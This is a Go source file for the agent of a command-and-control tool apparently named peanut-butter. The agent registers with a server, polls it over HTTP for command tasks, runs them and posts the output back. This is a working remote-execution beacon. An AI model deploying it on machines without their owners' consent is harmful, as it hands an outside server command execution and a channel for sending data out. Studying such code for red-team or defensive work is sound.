// The agent which executes commands and sends results back to the server
package agent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/MeHungr/peanut-butter/internal/api"
)

// Agent has an api.Agent embedded, and creates additional methods
// and fields for use in the agent package
type Agent struct {
	api.Agent
	*http.Client
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "?.?.?.?"
	}
	for _, addr := range addrs {
		// Filters out loopback addresses
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "?.?.?.?"
}

func (a *Agent) ToAPI() api.Agent {
	return api.Agent{
		ID:               a.ID,
		OS:               a.OS,
		Arch:             a.Arch,
		AgentIP:          a.AgentIP,
		ServerIP:         a.ServerIP,
		ServerPort:       a.ServerPort,
		CallbackInterval: a.CallbackInterval,
		Hostname:         a.Hostname,
		Status:           a.Status,
		LastSeen:         a.LastSeen,
	}
}

// Register allows the agent to register with the server
func (a *Agent) Register() error {
	agent := a.ToAPI()
	url := fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort)

	// Marshals the agent's id into JSON
	body, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("Failed to marshal JSON: %w", err)
	}

	// POST request with the agent's id as the body
	resp, err := a.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return fmt.Errorf("Failed to send POST request: %w", err)
	}
	defer resp.Body.Close()

	// Read the body of the response into a variable
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Failed to read response: %w", err)
	}

	// Print server response
	if resp.StatusCode == http.StatusOK {
		var msg api.Message
		if err := json.Unmarshal(respBody, &msg); err != nil {
			return fmt.Errorf("Failed to unmarshal server response: %w", err)
		}
		fmt.Println(msg.Message)
	} else {
		return fmt.Errorf("Server returned status code %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// GetTask retrieves a task from the server to be executed
func (agent *Agent) GetTask() (*api.Task, error) {
	url := fmt.Sprintf("http://%s:%d/task", agent.ServerIP, agent.ServerPort)

	// Marshals the agent's id into JSON
	body, err := json.Marshal(map[string]string{
		"agent_id": agent.ID,
	})
	if err != nil {
		return nil, fmt.Errorf("Failed to marshal JSON: %w", err)
	}

	// POST request with the agent's id as the body
	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("Failed to send POST request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil // No task available
	} else if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
	} else {
		// Decodes the JSON body into a Task
		var agentTask api.Task
		if err := json.NewDecoder(resp.Body).Decode(&agentTask); err != nil {
			return nil, fmt.Errorf("Failed to decode task JSON: %w", err)
		}
		return &agentTask, nil
	}
}

// ExecuteTask executes the task retrieved by GetTask
func (agent *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
	if strings.TrimSpace(task.Payload) == "" {
		return &api.Result{Output: "No task payload"}, nil
	}

	// Declares the result and its agent id
	result := &api.Result{
		Task: *task,
	}

	switch task.Type {
	case api.Command:
		result.Output, result.ReturnCode = executeCommand(task)
	default:
		return result, fmt.Errorf("Undefined task type in JSON: %s", task.Type)
	}

	return result, nil
}

func (agent *Agent) SendResult(result *api.Result) error {
	// Ensures result is not a nil pointer
	if result == nil {
		return fmt.Errorf("result is nil")
	}

	url := fmt.Sprintf("http://%s:%d/result", agent.ServerIP, agent.ServerPort)

	// Marshals the result into JSON
	body, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("Failed to marshal JSON: %w", err)
	}

	// Sends a POST request containing the result
	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return fmt.Errorf("Failed to send POST request: %w", err)
	}
	defer resp.Body.Close()

	// Checks the status code and reports errors, does nothing on OK
	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

func (agent *Agent) Start() {
	fmt.Printf("Agent starting with ID: %s\n", agent.ID)

	// Attempt to register with the server until successful
	for {
		err := agent.Register()
		if err != nil {
			fmt.Println(err)
			time.Sleep(5 * time.Second)
			continue
		}
		break
	}

	// Main polling loop
	for {
		task, err := agent.GetTask()
		if err != nil {
			fmt.Println(err)
		}

		if task != nil {
			result, err := agent.ExecuteTask(task)
			if err != nil {
				fmt.Println(err)
			}
			if err := agent.SendResult(result); err != nil {
				fmt.Println(err)
			}
		}

		time.Sleep(agent.CallbackInterval)
	}
}
